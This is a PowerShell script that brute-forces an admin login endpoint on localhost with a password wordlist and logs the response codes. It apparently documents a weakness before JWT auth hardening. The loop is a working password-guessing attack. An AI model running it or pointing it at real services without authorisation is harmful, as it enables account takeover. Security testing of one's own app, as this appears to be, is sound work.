$email = "useradmin@gmail.com"
$words = Get-Content ..\docs\findings\05-jwt-auth-hardening\admin-passwords.txt
$tmp = "$env:TEMP\login-body.json"

$results = foreach ($w in $words) {
  $body = '{"email":"' + $email + '","password":"' + $w + '"}'
  Set-Content -Path $tmp -Value $body -Encoding utf8 -NoNewline

  $code = curl.exe -s -o NUL -w "%{http_code}" -X POST http://localhost:5000/api/admins/login `
    -H "Content-Type: application/json" `
    --data-binary "@$tmp"

  "$w -> $code"
  Start-Sleep -Milliseconds 100
}

$results | Out-File -Encoding utf8 ..\docs\findings\05-jwt-auth-hardening\before-weakness-bruteforce.txt
$results
